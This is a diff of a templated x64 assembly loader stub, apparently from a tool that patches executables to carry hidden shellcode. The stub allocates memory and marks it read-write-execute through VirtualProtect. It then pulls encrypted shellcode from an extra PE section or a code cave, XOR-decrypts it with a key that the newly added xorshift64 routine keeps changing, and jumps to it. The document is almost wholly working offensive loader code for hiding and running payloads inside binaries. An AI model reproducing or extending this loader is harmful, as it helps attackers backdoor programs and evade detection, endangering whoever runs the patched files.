@@ -8,6 +8,7 @@
 // r14 store address of VirtualProtect
 // r15 store address of CreateThread
 
+entry:
 // get core procedure address
 {{if .LackProcedure}}
   // push kernel32 module name to stack
@@ -170,32 +171,32 @@
 
 {{end}}
 
-// allocate memory for shellcode
-xor rcx, rcx
-mov rdx, {{hex .MemRegionSize}}
-mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
-mov r9, 0x04    // PAGE_READWRITE
-sub rsp, 0x20
-call {{.RegN.r13}}
-add rsp, 0x20
+  // allocate memory for shellcode
+  xor rcx, rcx
+  mov rdx, {{hex .MemRegionSize}}
+  mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
+  mov r9, 0x04    // PAGE_READWRITE
+  sub rsp, 0x20
+  call {{.RegN.r13}}
+  add rsp, 0x20
 
-// store allocated memory address
-push rax
+  // store allocated memory address
+  push rax
 
-// adjust memory region protect
-sub rsp, 0x08 // for store old protect
-mov rcx, rax
-mov rdx, {{hex .MemRegionSize}}
-mov r8, 0x40 // PAGE_EXECUTE_READWRITE
-mov r9, rsp
-sub rsp, 0x20
-call {{.RegN.r14}}
-add rsp, 0x20
-add rsp, 0x08 // restore stack
+  // adjust memory region protect
+  sub rsp, 0x08 // for store old protect
+  mov rcx, rax
+  mov rdx, {{hex .MemRegionSize}}
+  mov r8, 0x40 // PAGE_EXECUTE_READWRITE
+  mov r9, rsp
+  sub rsp, 0x20
+  call {{.RegN.r14}}
+  add rsp, 0x20
+  add rsp, 0x08 // restore stack
 
-// read shellcode from section or code cave self
+// read shellcode from extended section or code cave
 {{if .SectionMode}}
-  // extract encrypted shellcode from section
+  // extract encrypted shellcode from extended section
   push rsi
   push rdi
   mov rsi, {{.RegN.rdi}}
@@ -203,14 +204,15 @@ add rsp, 0x08 // restore stack
   mov rdi, [rsp + 16]
   add rdi, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-next1:
+  next1:
   movsb
   inc rsi
+  // check extract shellcode is finish
   dec {{.RegV.rcx}}
   test {{.RegV.rcx}}, {{.RegV.rcx}}
   jz break1
   jmp next1
-break1:
+  break1:
   pop rdi
   pop rsi
 
@@ -219,34 +221,51 @@ break1:
   mov {{.RegV.rdx}}, [rsp]
   add {{.RegV.rdx}}, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-next2:
+  next2:
   mov {{.RegV.r8}}, [{{.RegV.rdx}}]
   xor {{.RegV.r8}}, {{.RegV.rax}}
   mov [{{.RegV.rdx}}], {{.RegV.r8}}
+  // update the key with xorshift64
+  call xor_shift
+  // check decrypt shellcode is finish
   add {{.RegV.rdx}}, 8
   sub {{.RegV.rcx}}, 8
   test {{.RegV.rcx}}, {{.RegV.rcx}}
   jz break2
   jmp next2
-break2:
+  break2:
 
 {{else}}
+  // extract encrypted shellcode from code cave
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
   mov {{.RegN.rdi}}, [rsp]
   add {{.RegN.rdi}}, {{hex .EntryOffset}}
   {{STUB CodeCaveMode STUB}}
 {{end}}
 
-// get the shellcode entry point
-mov {{.RegV.rax}}, [rsp]
-add {{.RegV.rax}}, {{hex .EntryOffset}}
+  // get the shellcode entry point
+  mov {{.RegV.rax}}, [rsp]
+  add {{.RegV.rax}}, {{hex .EntryOffset}}
 
-// restore stack about allocated memory address
-add rsp, 0x08
+  // restore stack about allocated memory address
+  add rsp, 0x08
 
-// call the shellcode
-sub rsp, 0x20
-call {{.RegV.rax}}
-add rsp, 0x20
+  // call the shellcode
+  sub rsp, 0x20
+  call {{.RegV.rax}}
+  add rsp, 0x20
 
-int3
+  // mark the end of shellcode
+  int3
+
+xor_shift:
+  mov {{.RegV.r8}}, {{.RegV.rax}}
+  shl {{.RegV.r8}}, 13
+  xor {{.RegV.rax}}, {{.RegV.r8}}
+  mov {{.RegV.r8}}, {{.RegV.rax}}
+  shr {{.RegV.r8}}, 7
+  xor {{.RegV.rax}}, {{.RegV.r8}}
+  mov {{.RegV.r8}}, {{.RegV.rax}}
+  shl {{.RegV.r8}}, 17
+  xor {{.RegV.rax}}, {{.RegV.r8}}
+  ret
